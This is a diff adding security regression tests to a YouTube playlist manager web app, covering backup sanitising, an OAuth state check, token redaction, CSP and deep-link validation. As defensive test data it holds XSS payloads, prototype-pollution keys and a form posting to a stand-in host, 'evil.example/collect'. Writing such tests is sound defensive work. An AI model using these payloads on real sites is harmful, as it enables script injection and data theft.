@@ -1983,10 +1983,12 @@ const SUITES = [
     ['a valid postMessage resolves the wait with the token', async w => {
       const realOpen = w.open;
       try {
-        w.open = () => ({ closed: false, close() {} });
+        let state = '';
+        w.open = url => { state = new URL(url).searchParams.get('state'); return { closed: false, close() {} }; };
         const pending = w.openOAuthPopup('scope');
-        // The popup would post this from our own origin.
-        w.postMessage({ type: 'reel-oauth-token', token: 'TOK_OK', expiresIn: 3600 }, w.location.origin);
+        // The popup would post this from our own origin, with the state
+        // Google handed back to it (#G6).
+        w.postMessage({ type: 'reel-oauth-token', token: 'TOK_OK', expiresIn: 3600, state }, w.location.origin);
         const r = await pending;
         eq(r.blocked, false, 'blocked');
         eq(r.token, 'TOK_OK', 'token');
@@ -3227,7 +3229,7 @@ const SUITES = [
       try {
         await w.cacheStore.writeAll({
           timestamp: '2999-01-01T00:00:00.000Z',
-          playlists: [{ id: 'PL_aud14_off', title: 'o', videos: [{ videoId: 'V1', title: 'one', thumbnail: 'u' }] }],
+          playlists: [{ id: 'PL_aud14_off', title: 'o', videos: [{ videoId: 'V1_aud14off', title: 'one', thumbnail: 'https://i.ytimg.com/vi/V1_aud14off/mqdefault.jpg' }] }],
           playlistObjects: [{ id: 'PL_aud14_off', snippet: { title: 'o' }, contentDetails: { itemCount: 1 }, status: {} }],
           tags: {}, tagIcons: {}, folders: [], folderAssignments: {}, deckColumns: [], watchQueue: [], bookmarkedPlaylists: [],
         });
@@ -3660,6 +3662,396 @@ const SUITES = [
     }],
   ],
 },
+{
+  id: 'AUD-06', title: 'A backup file is checked before anything reads it', note: 'import and restore only checked that "playlists" was an array; every other field went verbatim into state, storage and HTML',
+  cases: [
+    ['a well-formed backup comes through unchanged (B1)', w => {
+      const good = aud06Backup();
+      const out = w.sanitizeBackup(JSON.parse(JSON.stringify(good)));
+      eq(out.schemaVersion, 1, 'version');
+      eq(out.playlists.map(p => [p.id, p.title, p.videos.map(v => [v.videoId, v.itemId, v.title, v.thumbnail])]),
+         good.playlists.map(p => [p.id, p.title, p.videos.map(v => [v.videoId, v.itemId, v.title, v.thumbnail])]), 'playlists');
+      eq(out.playlistObjects, good.playlistObjects, 'playlist objects');
+      for (const k of ['tags', 'tagIcons', 'folders', 'folderAssignments', 'deckColumns', 'watchQueue', 'bookmarkedPlaylists']) eq(out[k], good[k], k);
+      return 'every field kept';
+    }],
+    ['hostile ids, video ids and image URLs are dropped (B2)', w => {
+      const bad = aud06Backup();
+      bad.playlists.push({ id: AUD06_ID, title: 'x', videos: [] });
+      bad.playlists[0].videos.push({ videoId: "abc'onx=1", title: 'x' }, { videoId: 'dQw4w9WgXcQ', title: 'y', thumbnail: 'javascript:alert(1)' });
+      bad.playlistObjects.push({ id: AUD06_ID, snippet: { title: 'x', thumbnails: { medium: { url: 'https://evil.example/a.jpg' } } } });
+      bad.playlistObjects[0].snippet.thumbnails.default = { url: 'https://i.ytimg.com/vi/x/a.jpg" onerror="window.__pwn=1' };
+      bad.tags[AUD06_ID] = ['t'];
+      bad.folderAssignments.PL_aud06a = AUD06_ID;
+      bad.folders.push({ id: AUD06_ID, name: 'x' });
+      bad.deckColumns.push({ type: 'playlist', playlistId: AUD06_ID });
+      bad.watchQueue.push({ videoId: AUD06_ID, title: 'x' });
+      bad.bookmarkedPlaylists.push({ id: AUD06_ID });
+      const out = JSON.stringify(w.sanitizeBackup(bad));
+      ok(!out.includes('__pwn') && !out.includes('evil.example') && !out.includes('javascript:') && !out.includes("onx="), 'a hostile value survived: ' + out);
+      const s = w.sanitizeBackup(bad);
+      eq(s.playlists[0].videos.map(v => [v.videoId, v.thumbnail]), [['dQw4w9WgXcQ', 'https://i.ytimg.com/vi/dQw4w9WgXcQ/mqdefault.jpg'], ['dQw4w9WgXcQ', undefined]], 'videos');
+      return eq(s.deckColumns[1], { type: 'playlist', playlistId: null }, 'a column with a bad id is kept, empty');
+    }],
+    ['a newer file, or one that is not a backup, is refused', w => {
+      const current = w.sanitizeBackup({ playlists: [] }).schemaVersion;
+      eq(w.sanitizeBackup({ ...aud06Backup(), schemaVersion: current + 1 }), null, 'newer version');
+      eq(w.sanitizeBackup({ playlists: {} }), null, 'playlists not an array');
+      eq(w.sanitizeBackup([]), null, 'array');
+      eq(w.sanitizeBackup('x'), null, 'string');
+      return eq(w.sanitizeBackup({ playlists: [] }).playlists, [], 'an unversioned file reads as version 1');
+    }],
+    ['"__proto__" keys stay out of every map', w => {
+      const raw = JSON.parse('{"playlists":[{"id":"__proto__","title":"p"}],"tags":{"__proto__":["polluted"]},'
+        + '"tagIcons":{"__proto__":"x","constructor":"y"},"folderAssignments":{"__proto__":"f_a"}}');
+      const out = w.sanitizeBackup(raw);
+      eq(out.playlists.length, 0, 'playlists');
+      ok(Object.getPrototypeOf(out.tags) === w.Object.prototype && out.tags.polluted === undefined, 'tags prototype changed');
+      ok(Object.getPrototypeOf(out.folderAssignments) === w.Object.prototype, 'folderAssignments prototype changed');
+      return eq(Object.keys(out.tagIcons), [], 'tag icons');
+    }],
+    ['restore reads the checked copy only', w => {
+      const bad = aud06Backup();
+      bad.folders[0].id = AUD06_ID;
+      bad.tags[AUD06_ID] = ['t'];
+      const r = w.parseJSONForRestore(JSON.stringify(bad));
+      ok(!JSON.stringify(r).includes('__pwn'), 'a hostile id reached the restore data');
+      return eq(r.metadata.folders.length, 0, 'folders');
+    }],
+    ['login-screen import stores the checked copy, and refuses non-JSON and empty files (B7)', async w => {
+      const snap = snapshot(w, ['lastBackup', 'lastBackupTimestamp', 'diagnosticLog']);
+      const real = { showToast: w.showToast, setTimeout: w.setTimeout };
+      const toasts = [];
+      try {
+        w.showToast = (msg, type) => toasts.push(msg);
+        w.setTimeout = (fn, ms) => String(fn).includes('reload') ? 0 : real.setTimeout.call(w, fn, ms);
+        const importFile = async (name, text) => {
+          toasts.length = 0;
+          w.importBackupFromLoginScreen({ files: [new w.File([text], name)], value: name });
+          for (let i = 0; i < 50 && !toasts.length; i++) await new Promise(r => setTimeout(r, 20));
+        };
+        await importFile('b.csv', 'a,b');
+        eq(toasts, [w.t('toast_import_invalid')], 'csv');
+        w.localStorage.setItem('lastBackup', '{"untouched":1}');
+        await importFile('b.json', '{"playlists":[]}');
+        eq(toasts, [w.t('toast_import_invalid')], 'empty');
+        eq(w.localStorage.getItem('lastBackup'), '{"untouched":1}', 'storage after a refused file');
+        const bad = aud06Backup();
+        bad.playlists.push({ id: AUD06_ID, title: 'x' });
+        bad.playlistObjects.push({ id: AUD06_ID, snippet: { title: 'x' } });
+        await importFile('b.json', JSON.stringify(bad));
+        const stored = w.localStorage.getItem('lastBackup');
+        ok(!stored.includes('__pwn'), 'the hostile id was stored');
+        return eq(JSON.parse(stored).playlists.length, 2, 'good playlists stored');
+      } finally { Object.assign(w, real); restore(w, snap); }
+    }],
+    ['a hostile backup already in storage is cleaned at startup', async w => {
+      const snap = snapshot(w, ['lastBackup', 'lastBackupTimestamp']);
+      const real = { ytApi: w.ytApi, showToast: w.showToast };
+      w.showToast = () => {};
+      try {
+        const bad = aud06Backup();
+        bad.playlists.push({ id: AUD06_ID, title: 'x', videos: [] });
+        bad.playlistObjects.push({ id: AUD06_ID, snippet: { title: 'x' }, contentDetails: { itemCount: 0 } });
+        delete bad.bookmarkedPlaylists;
+        w.localStorage.setItem('lastBackup', JSON.stringify(bad));
+        w.localStorage.setItem('lastBackupTimestamp', new Date().toISOString());
+        await w.loadBackupFromStorage();
+        w.refreshPlaylistsList();
+        const list = w.document.getElementById('playlistsList');
+        const ids = [...list.querySelectorAll('[data-playlist-id]')].map(e => e.dataset.playlistId);
+        const handlers = [...list.querySelectorAll('[onclick]')].map(e => e.getAttribute('onclick'));
+        ok(!handlers.some(h => h.includes('__pwn')), 'a hostile id reached an inline handler');
+        return eq(ids.sort(), ['PL_aud06a', 'PL_aud06b'], 'rendered playlists');
+      } finally {
+        restore(w, snap);
+        w.ytApi = async () => ({ items: [] });
+        try { await w.loadAllPlaylists(); } catch (_) {}
+        Object.assign(w, real);
+      }
+    }],
+    ['folder and tag names and icons render as text', w => {
+      const html = w.renderFolderNode({ id: 'f_aud06', name: AUD06_HTML, icon: AUD06_HTML, parentId: null })
+        + w.renderTagWithIcon(AUD06_HTML);
+      const box = w.document.createElement('div');
+      box.innerHTML = html;
+      eq(box.querySelectorAll('img').length, 0, 'elements injected');
+      eq(box.querySelector('.folder-name').textContent, AUD06_HTML, 'folder name');
+      box.innerHTML = w.getEmojiPickerHtml('', "tagIcon_a'b\"c");
+      return ok(box.querySelectorAll('[onclick*="pickEmoji"]').length > 1 && !box.querySelector('[c]'), 'the picker id broke its handler');
+    }],
+  ],
+},
+{
+  id: 'AUD-07', title: 'Reel Studio handlers take tag names and ids literally', note: 'Studio escaped for HTML inside a JS string: the attribute decoder turned &#39; back into a quote',
+  cases: [
+    ['a hostile tag name filters the playlists and runs nothing (X4)', async w => {
+      const r = await withStudioLibrary(w, async sw => {
+        sw.location.hash = '#/tags';
+        await aud07Tick();
+        const card = sw.document.querySelector('article[onclick*="UI.plTag"]');
+        ok(card, 'no tag card rendered');
+        card.click();
+        await aud07Tick();
+        return { pwn: sw.__pwn, hash: sw.location.hash, cards: sw.document.querySelectorAll('.pl-card').length,
+                 chip: (sw.document.querySelector('.chip.active') || {}).textContent };
+      });
+      eq(r.pwn, undefined, 'the tag name ran as code');
+      eq(r.hash, '#/playlists', 'route');
+      eq(r.chip, AUD07_TAG + ' ×', 'active tag filter');
+      return eq(r.cards, 1, 'playlists shown for the tag');
+    }],
+    ['a playlist id with quotes and backslashes reaches the router intact', async w => {
+      const r = await withStudioLibrary(w, async sw => {
+        sw.location.hash = '#/playlists';
+        await aud07Tick();
+        const card = [...sw.document.querySelectorAll('.pl-card')].find(c => c.getAttribute('onclick').includes('aud07b'));
+        ok(card, 'no card for the odd id');
+        card.click();
+        await aud07Tick();
+        return { pwn: sw.__pwn, hash: sw.location.hash };
+      });
+      eq(r.pwn, undefined, 'the id ran as code');
+      return eq(r.hash, '#/playlists/' + encodeURIComponent(AUD07_ID), 'route');
+    }],
+  ],
+},
+{
+  id: '#G6', title: 'A returning token is accepted only for a sign-in this tab started', note: 'the implicit flow took any #access_token, so a link could sign a victim into the attacker\'s account',
+  cases: [
+    ['every sign-in sends a fresh random state', w => {
+      const a = w.newOAuthState(), b = w.newOAuthState();
+      ok(/^[0-9a-f]{32}$/.test(a), 'format: ' + a);
+      ok(a !== b, 'two sign-ins shared a state');
+      eq(new URL(w.buildAuthUrl('scope', a)).searchParams.get('state'), a, 'state in the auth URL');
+      const redirect = w.startOAuth.toString();
+      return ok(redirect.includes('sessionStorage.setItem(OAUTH_STATE_KEY, state)') && redirect.includes('buildAuthUrl(s, state)'),
+                'the redirect sign-in does not store the state it sends');
+    }],
+    ['a token without a state is refused, and still leaves the URL (X9)', w => {
+      const r = runCheckAuth(w, 'EXPECTED_STATE', '#access_token=G6_NOSTATE&expires_in=3600');
+      eq(r.tokens, [], 'token accepted');
+      ok(!r.href.includes('access_token'), 'token left in the URL');
+      return eq(r.toasts, [w.t('toast_oauth_state_mismatch')], 'message');
+    }],
+    ['a token with another state is refused (X9)', w => {
+      const r = runCheckAuth(w, 'EXPECTED_STATE', '#access_token=G6_WRONG&expires_in=3600&state=ATTACKER_STATE');
+      return eq(r.tokens, [], 'token accepted');
+    }],
+    ['a token with no sign-in pending is refused', w => {
+      const r = runCheckAuth(w, null, '#access_token=G6_NOPENDING&state=anything');
+      return eq(r.tokens, [], 'token accepted');
+    }],
+    ['the token this tab asked for is accepted, once', w => {
+      // No expires_in: an accepted fragment would otherwise set this page's expiry.
+      const first = runCheckAuth(w, 'S1', '#access_token=G6_OK&state=S1');
+      eq(first.tokens, ['G6_OK'], 'first return');
+      eq(first.stateLeft, null, 'state kept after use');
+      const replay = runCheckAuth(w, undefined, '#access_token=G6_OK&state=S1');
+      return eq(replay.tokens, [], 'the same fragment accepted twice');
+    }],
+    ['the popup accepts only the state it was opened with', async w => {
+      const realOpen = w.open;
+      const fake = { closed: false, close() {} };
+      try {
+        let state = '';
+        w.open = url => { state = new URL(url).searchParams.get('state'); return fake; };
+        const pending = w.openOAuthPopup('scope');
+        ok(/^[0-9a-f]{32}$/.test(state), 'no state in the popup URL');
+        let settled = false;
+        pending.then(() => { settled = true; });
+        w.postMessage({ type: 'reel-oauth-token', token: 'EVIL', state: 'nope' }, w.location.origin);
+        w.postMessage({ type: 'reel-oauth-token', token: 'EVIL2' }, w.location.origin);
+        await new Promise(r => setTimeout(r, 120));
+        ok(!settled, 'a token with the wrong state ended the wait');
+        w.postMessage({ type: 'reel-oauth-token', token: 'GOOD', state }, w.location.origin);
+        return eq((await pending).token, 'GOOD', 'token');
+      } finally { fake.closed = true; w.open = realOpen; }
+    }],
+  ],
+},
+{
+  id: 'AUD-10', title: 'The diagnostic log never keeps a token', note: 'redaction matched whole strings only, and the message itself was never redacted',
+  cases: [
+    ['a token inside a longer string is redacted (X7)', w => {
+      const out = JSON.stringify(w._logRedact({
+        source: 'https://x/#access_token=ya29.abcDEF&x=1',
+        err: 'Request failed: Authorization: Bearer ya29.qwerty',
+        revoke: 'https://oauth2.googleapis.com/revoke?token=1//refresh-ish',
+        list: ['ok', 'see ya29.zzz_1 here'],
+      }));
+      ok(!/ya29\.[a-zA-Z]/.test(out) && !out.includes('abcDEF') && !out.includes('refresh-ish'), 'a token survived: ' + out);
+      return ok(out.includes('https://x/#access_token=…&x=1'), 'the rest of the URL should stay readable: ' + out);
+    }],
+    ['the message is redacted too (X7)', w => {
+      const out = aud10Logged(w, 'aud10msg', () => w.log('warn', 'test', 'aud10msg call failed with Bearer ya29.msgTOKEN'));
+      ok(out.length === 1, 'entry not found');
+      return eq(out[0].msg, 'aud10msg call failed with Bearer …', 'message');
+    }],
+    ['an uncaught error on a URL with a token logs no token', w => {
+      const out = aud10Logged(w, 'aud10err', () => w.dispatchEvent(new w.ErrorEvent('error', {
+        message: 'aud10err boom near #access_token=ya29.errTOKEN', filename: 'https://app/#access_token=ya29.fileTOKEN&expires_in=3599', lineno: 1 })));
+      ok(out.length === 1, 'entry not found');
+      const text = JSON.stringify(out[0]);
+      return ok(!text.includes('TOKEN'), 'a token reached the log: ' + text);
+    }],
+    ['ordinary text is left alone', w => {
+      eq(w._logRedact('hello world, token count 3'), 'hello world, token count 3', 'plain text');
+      return eq(w._logRedact({ q: 'a?list=PL123&index=2' }), { q: 'a?list=PL123&index=2' }, 'a URL without a token');
+    }],
+    ['no log call records a title', async w => {
+      const src = await fetch('youtube-playlist-manager.html?aud10=' + Date.now()).then(r => r.text());
+      const calls = src.match(/\blog\('(?:debug|info|warn|error)'[^;]*;/g) || [];
+      const withTitle = calls.filter(c => /[{,]\s*title\s*:/.test(c));
+      return eq(withTitle, [], 'log calls with a title');
+    }],
+  ],
+},
+{
+  id: 'AUD-09', title: 'The quota estimator runs no third-party script', note: 'Chart.js came from cdnjs without SRI, on the origin that holds the library and the diagnostic log',
+  cases: [
+    ['every script the tool pages load is local and pinned', async w => {
+      const bad = [];
+      for (const page of ['quota-estimator.html', 'how-it-works.html']) {
+        const doc = new DOMParser().parseFromString(await fetch(page + '?aud09=' + Date.now()).then(r => r.text()), 'text/html');
+        doc.querySelectorAll('script[src]').forEach(el => {
+          const src = el.getAttribute('src');
+          if (/^(https?:)?\/\//i.test(src) || !/^sha(256|384|512)-/.test(el.getAttribute('integrity') || '')) bad.push(page + ': ' + src);
+        });
+      }
+      return eq(bad, [], 'scripts from elsewhere, or without integrity');
+    }],
+    ['Chart.js loads from this origin and draws the estimator charts', async w => {
+      const f = document.createElement('iframe');
+      f.style.cssText = 'display:block;position:absolute;left:-12000px;top:0;width:1200px;height:900px;border:0;';
+      f.src = 'quota-estimator.html?aud09=' + Date.now();
+      try {
+        await new Promise((res, rej) => { f.onload = res; setTimeout(() => rej(new Error('estimator did not load')), 15000); document.body.appendChild(f); });
+        await new Promise(r => setTimeout(r, 300));
+        const cw = f.contentWindow;
+        ok(cw.Chart, 'Chart.js did not load (a wrong integrity hash blocks it too)');
+        eq(cw.Chart.version, '4.4.1', 'version');
+        return ok(Object.keys(cw.Chart.instances || {}).length > 0, 'no chart drawn');
+      } finally { f.remove(); }
+    }],
+  ],
+},
+{
+  id: 'AUD-08', title: 'Every page has a CSP, and none lets a form post data out', note: 'form-action was missing (it does not fall back to default-src), and the two tool pages had no CSP at all',
+  cases: [
+    ['each page declares a CSP with form-action and object-src locked', async w => {
+      const missing = [];
+      for (const page of ['youtube-playlist-manager.html', 'reel-studio.html', 'quota-estimator.html', 'how-it-works.html']) {
+        const csp = await aud08Csp(page);
+        if (!csp) { missing.push(page + ': no CSP'); continue; }
+        if (!/(^|;)\s*form-action 'none'/.test(csp)) missing.push(page + ': form-action');
+        if (!/(^|;)\s*object-src 'none'/.test(csp)) missing.push(page + ': object-src');
+        if (!/(^|;)\s*base-uri 'self'/.test(csp)) missing.push(page + ': base-uri');
+      }
+      return eq(missing, [], 'gaps');
+    }],
+    ['an injected form cannot post to another site', async w => {
+      const doc = w.document;
+      const sink = doc.createElement('iframe');
+      sink.name = 'aud08sink';
+      sink.style.display = 'none';
+      const form = doc.createElement('form');
+      form.action = 'https://evil.example/collect';
+      form.method = 'POST';
+      form.target = 'aud08sink';
+      const violations = [];
+      const onViolation = e => violations.push(e.effectiveDirective || e.violatedDirective);
+      doc.addEventListener('securitypolicyviolation', onViolation);
+      doc.body.append(sink, form);
+      try {
+        form.submit();
+        await new Promise(r => setTimeout(r, 300));
+        return ok(violations.includes('form-action'), 'the post was not blocked by the CSP: ' + JSON.stringify(violations));
+      } finally { doc.removeEventListener('securitypolicyviolation', onViolation); form.remove(); sink.remove(); }
+    }],
+    ["the estimator's inline script matches the hash its CSP allows", async w => {
+      const html = await fetch('quota-estimator.html?aud08=' + Date.now()).then(r => r.text());
+      const code = html.match(/<script>([\s\S]*?)<\/script>/)[1];
+      const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(code));
+      const hash = 'sha256-' + btoa(String.fromCharCode(...new Uint8Array(digest)));
+      const csp = await aud08Csp('quota-estimator.html');
+      ok(!/script-src[^;]*'unsafe-inline'/.test(csp), "script-src still allows 'unsafe-inline'");
+      return ok(csp.includes("'" + hash + "'"), 'CSP does not allow the script as it is now; expected ' + hash);
+    }],
+    ['how-it-works still runs its script under its CSP', async w => {
+      const f = document.createElement('iframe');
+      f.style.cssText = 'display:block;position:absolute;left:-12000px;top:0;width:1024px;height:768px;border:0;';
+      f.src = 'how-it-works.html?aud08=' + Date.now();
+      try {
+        await new Promise((res, rej) => { f.onload = res; setTimeout(() => rej(new Error('page did not load')), 15000); document.body.appendChild(f); });
+        await new Promise(r => setTimeout(r, 200));
+        return ok(f.contentDocument.querySelector('[data-en]'), 'the page script did not run');
+      } finally { f.remove(); }
+    }],
+  ],
+},
+{
+  id: 'AUD-11', title: 'A ?bookmark= link can only bring a playlist id', note: 'the deep-link value went into the modal with only its double quotes escaped',
+  cases: [
+    ['raw playlist ids are kept as they are (U1)', w => {
+      const ids = ['PLabcdefghij', 'LLxxxxxxxxxx', 'RDxxxxxxxxxx', 'OLAK5uy_abcdefghijk'];
+      return eq(ids.map(w.extractPlaylistId), ids);
+    }],
+    ['full and share URLs give the id (U2)', w => eq([
+      'https://www.youtube.com/playlist?list=PLabcdefghij',
+      'https://youtu.be/xyz?list=PLabcdefghij&t=3',
+      'https://music.youtube.com/playlist?list=OLAK5uy_abcdefghijk',
+    ].map(w.extractPlaylistId), ['PLabcdefghij', 'PLabcdefghij', 'OLAK5uy_abcdefghijk'])],
+    ['anything else is refused (U3)', w => eq([
+      'PL', 'javascript:alert(1)', 'list=<script>', 'https://evil/?list=PL"onx=', '"><img src=x onerror=alert(1)>', '', null,
+    ].map(w.extractPlaylistId), [null, null, null, null, null, null, null])],
+    ['the deep link keeps only a valid id', w => eq([
+      '?bookmark=PLabcdefghij',
+      '?bookmark=' + encodeURIComponent('https://www.youtube.com/playlist?list=PLabcdefghij'),
+      '?bookmark=' + encodeURIComponent('"><img src=x onerror=alert(1)>'),
+      '?other=1',
+    ].map(w.readBookmarkDeepLink), ['PLabcdefghij', 'PLabcdefghij', null, null])],
+    ['the modal prefill is inert and holds only an id (U5)', w => {
+      const read = value => {
+        w.showAddBookmarkModal(value);
+        const box = w.document.getElementById('modalContent');
+        const r = { value: box.querySelector('#bookmarkInput').value, injected: box.querySelectorAll('img, [onerror]').length };
+        w.closeModal();
+        return r;
+      };
+      eq(read('"><img src=x onerror="window.__pwn=1">'), { value: '', injected: 0 }, 'hostile value');
+      eq(w.__pwn, undefined, 'ran');
+      return eq(read('https://www.youtube.com/playlist?list=PLabcdefghij'), { value: 'PLabcdefghij', injected: 0 }, 'a URL');
+    }],
+  ],
+},
+{
+  id: 'AUD-12', title: 'CSV restore reads every file the CSV export writes', note: 'titles keyed a plain object ("__proto__" threw) and the text was split on newlines before the quotes were read',
+  cases: [
+    ['a playlist named "__proto__" is an ordinary playlist (B3)', w => {
+      const r = w.parseCSVForRestore(aud12Csv(w, [['__proto__', 'Song', 'dQw4w9WgXcQ', 'Disponible']]));
+      eq(r.playlists.map(p => [p.title, p.videos.length]), [['__proto__', 1]], 'playlists');
+      return ok(Object.getPrototypeOf({}).videos === undefined, 'Object.prototype was touched');
+    }],
+    ['a quoted line break stays inside its cell (B4)', w => {
+      const r = w.parseCSVForRestore(aud12Csv(w, [['Mix', 'line1\nline2', 'dQw4w9WgXcQ', 'Disponible'],
+                                                  ['Mix', 'windows\r\nbreak', 'aaaaaaaaaaa', 'Disponible']]));
+      return eq(r.playlists[0].videos, [{ videoId: 'dQw4w9WgXcQ', title: 'line1\nline2' }, { videoId: 'aaaaaaaaaaa', title: 'windows\r\nbreak' }]);
+    }],
+    ['the formula guard is undone on the way back in, and only it (B5)', w => {
+      const csv = aud12Csv(w, [['=SUM(A1)', '=A1', 'dQw4w9WgXcQ', 'Disponible'], ['=SUM(A1)', "'Round Midnight", 'aaaaaaaaaaa', 'Disponible']]);
+      ok(csv.includes('"\'=A1"'), 'the export did not guard the formula');
+      const r = w.parseCSVForRestore(csv);
+      eq(r.playlists[0].title, '=SUM(A1)', 'playlist title');
+      return eq(r.playlists[0].videos.map(v => v.title), ['=A1', "'Round Midnight"], 'titles');
+    }],
+    ['deleted rows are skipped in either language (B6)', w => {
+      const r = w.parseCSVForRestore(aud12Csv(w, [['P', 'gone', 'dQw4w9WgXcQ', 'Supprimée'], ['P', 'gone too', 'aaaaaaaaaaa', 'Deleted'],
+                                                  ['P', 'here', 'bbbbbbbbbbb', 'Available']]));
+      return eq(r.playlists[0].videos.map(v => v.videoId), ['bbbbbbbbbbb']);
+    }],
+  ],
+},
 // Keep this suite last: its final case leaves the page in the "about to reload"
 // state a real deletion ends in, where the log no longer persists.
 {
@@ -3820,20 +4212,23 @@ async function runGhostClean(w, opts) {
   const real = { ytApi: w.ytApi, showToast: w.showToast, confirm: w.confirm, scanGhostVideos: w.scanGhostVideos,
                  checkBackupSafety: w.checkBackupSafety, checkQuotaBudget: w.checkQuotaBudget };
   const deleted = [], toasts = [];
-  const ghost = (id, v) => ({ videoId: v, itemId: id, title: 'Deleted video' });
+  // Real-shaped ids: a backup check (AUD-06) drops video ids that are not 11
+  // characters, bookmark ids that are not playlist ids, and non-Google images.
+  const vid = s => s.padEnd(11, '_');
+  const ghost = (id, v) => ({ videoId: vid(v), itemId: id, title: 'Deleted video' });
   try {
     await w.cacheStore.writeAll({
       timestamp: '2999-01-01T00:00:00.000Z',
       playlists: [
-        { id: 'PL_own', title: 'own', videos: [ghost('IG1', 'VG1'), ghost('IG2', 'VG2'), { videoId: 'VOK', itemId: 'IOK', title: 'fine', thumbnail: 'u' }] },
-        { id: 'PL_bm', title: 'bm', videos: [ghost('IG3', 'VG3')] },
+        { id: 'PL_own', title: 'own', videos: [ghost('IG1', 'VG1'), ghost('IG2', 'VG2'), { videoId: vid('VOK'), itemId: 'IOK', title: 'fine', thumbnail: 'https://i.ytimg.com/vi/VOK/mqdefault.jpg' }] },
+        { id: 'PL_bm_aud24x', title: 'bm', videos: [ghost('IG3', 'VG3')] },
       ],
       playlistObjects: [
         { id: 'PL_own', snippet: { title: 'own' }, contentDetails: { itemCount: 3 }, status: {} },
-        { id: 'PL_bm', snippet: { title: 'bm' }, contentDetails: { itemCount: 1 }, status: {} },
+        { id: 'PL_bm_aud24x', snippet: { title: 'bm' }, contentDetails: { itemCount: 1 }, status: {} },
       ],
       tags: {}, tagIcons: {}, folders: [], folderAssignments: {}, deckColumns: [], watchQueue: [],
-      bookmarkedPlaylists: [{ id: 'PL_bm', addedAt: '2026-09-01T00:00:00Z' }],
+      bookmarkedPlaylists: [{ id: 'PL_bm_aud24x', addedAt: '2026-09-01T00:00:00Z' }],
     });
     await w.loadBackupFromStorage();
     w.ytApi = async (endpoint, params, method) => {
@@ -3841,7 +4236,7 @@ async function runGhostClean(w, opts) {
       if (endpoint === 'videos') {
         if (opts.recheckFails) throw new Error('Server error (503) — please try again later');
         const asked = String(params.id).split(',');
-        return { items: (opts.alive || []).filter(v => asked.includes(v)).map(id => ({ id })) };
+        return { items: (opts.alive || []).map(vid).filter(v => asked.includes(v)).map(id => ({ id })) };
       }
       return { items: [] };
     };
@@ -3895,6 +4290,117 @@ async function runRetry(w, method, script) {
     catch (e) { threw = true; message = e.message; }
     return { fetches, threw, message, toasts };
   } finally { Object.assign(w, real); }
+}
+
+// AUD-12 — a CSV in the export's exact shape (BOM, bare header, csvRow cells)
+// from [playlist, video title, videoId, status] rows.
+function aud12Csv(w, rows) {
+  const header = ['Playlist', 'Playlist ID', 'Titre vidéo', 'URL YouTube', 'Chaîne', 'Durée', 'Statut', 'Date ajout', 'Position', 'Tags'];
+  return '\uFEFF' + header.join(',') + '\n' + rows.map(([pl, title, id, status]) =>
+    w.csvRow([pl, 'PLx', title, 'https://www.youtube.com/watch?v=' + id, 'c', 'PT1M', status, '', 0, ''])).join('\n');
+}
+
+// AUD-08 — the CSP a page declares in its <meta>, or '' if it has none.
+async function aud08Csp(page) {
+  const doc = new DOMParser().parseFromString(await fetch(page + '?aud08=' + Date.now()).then(r => r.text()), 'text/html');
+  const meta = doc.querySelector('meta[http-equiv="Content-Security-Policy"]');
+  return meta ? meta.getAttribute('content') : '';
+}
+
+// AUD-10 — run something that logs, persist the log and return the entries
+// that mention `marker`. The stored log is put back afterwards.
+function aud10Logged(w, marker, act) {
+  const snap = snapshot(w, ['diagnosticLog']);
+  try {
+    act();
+    w.persistLog();
+    const all = JSON.parse(w.localStorage.getItem('diagnosticLog') || '[]');
+    return all.filter(e => String(e.msg).includes(marker) || JSON.stringify(e.data || '').includes(marker));
+  } finally { restore(w, snap); }
+}
+
+// #G6 — run checkAuth() on a fragment with a given pending state (null: none,
+// undefined: leave whatever is there). Records what it would have signed in with.
+function runCheckAuth(w, pending, fragment) {
+  const real = { setAccessToken: w.setAccessToken, showApp: w.showApp, showToast: w.showToast };
+  const lsSnap = snapshot(w, ['lastLoginTimestamp']);
+  const ssKeys = ['oauthState', 'loggedOut', 'tokenExpiresAt'];
+  const ssSnap = ssKeys.map(k => w.sessionStorage.getItem(k));
+  const tokens = [], toasts = [];
+  try {
+    if (pending === null) w.sessionStorage.removeItem('oauthState');
+    else if (pending !== undefined) w.sessionStorage.setItem('oauthState', pending);
+    w.setAccessToken = tok => { tokens.push(tok); return tok; };
+    w.showApp = () => {};
+    w.showToast = m => toasts.push(m);
+    w.history.replaceState({}, '', w.location.pathname + fragment);
+    w.checkAuth();
+    return { tokens, toasts, href: w.location.href, stateLeft: w.sessionStorage.getItem('oauthState') };
+  } finally {
+    Object.assign(w, real);
+    w.history.replaceState({}, '', w.location.pathname);
+    ssKeys.forEach((k, i) => { if (ssSnap[i] === null) w.sessionStorage.removeItem(k); else w.sessionStorage.setItem(k, ssSnap[i]); });
+    restore(w, lsSnap);
+  }
+}
+
+// AUD-07 — Reel Studio reads the app's cache straight from IndexedDB, so a
+// library written there reaches it without going through the app's checks.
+const AUD07_TAG = "a';window.__pwn=1;'";
+const AUD07_ID = "PL_aud07b\\';window.__pwn=1;//";
+const aud07Tick = () => new Promise(r => setTimeout(r, 120));
+async function withStudioLibrary(w, body) {
+  const idb = await idbSnapshot(w);
+  const vid = (id, n) => ({ videoId: (id + n).padEnd(11, '_').slice(0, 11), title: 'v' + n, duration: 'PT1M', channel: 'c' });
+  let f;
+  try {
+    await w.cacheStore.writeAll({
+      timestamp: new Date().toISOString(),
+      playlists: [
+        { id: 'PL_aud07a', title: 'Tagged', videos: [vid('a', 1), vid('a', 2)] },
+        { id: AUD07_ID, title: 'Odd id', videos: [vid('b', 1)] },
+      ],
+      playlistObjects: [],
+      tags: { PL_aud07a: [AUD07_TAG] }, tagIcons: {}, folders: [], folderAssignments: {}, deckColumns: [], watchQueue: [],
+    });
+    f = await openStudio();
+    await aud07Tick();
+    return await body(f.contentWindow);
+  } finally {
+    if (f) f.remove();
+    await idbRestore(w, idb);
+  }
+}
+
+// AUD-06 — a backup in the exact shape sanitizeBackup() writes, so a clean
+// file can be compared field by field, plus the two payloads used against it.
+const AUD06_ID = "x');window.__pwn=1;//";
+const AUD06_HTML = '<img src=x onerror="window.__pwn=1">';
+function aud06Backup() {
+  const thumb = 'https://i.ytimg.com/vi/dQw4w9WgXcQ/mqdefault.jpg';
+  return {
+    schemaVersion: 1,
+    timestamp: '2026-09-01T10:00:00.000Z',
+    playlists: [
+      { id: 'PL_aud06a', title: 'Alpha', description: '', videos: [
+        { videoId: 'dQw4w9WgXcQ', itemId: 'UExfYXVkMDZhLmRRdzR3OVdnWGNR', title: 'Never Gonna Give You Up', position: 0,
